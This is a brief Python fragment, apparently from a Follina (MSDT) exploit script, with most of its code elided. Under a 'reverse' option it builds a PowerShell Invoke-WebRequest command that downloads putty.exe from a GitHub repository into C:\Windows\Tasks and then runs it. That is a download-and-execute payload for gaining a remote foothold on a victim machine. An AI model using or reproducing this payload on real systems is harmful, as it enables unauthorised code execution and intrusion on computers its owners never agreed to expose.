...
def main(args):
    ...
    if args.reverse:
        command = f"""Invoke-WebRequest https://github.com/aminebenhariz/msdt-follina/blob/main/putty.exe?raw=true -OutFile C:\\Windows\\Tasks\\putty.exe; C:\\Windows\\Tasks\\putty.exe"""
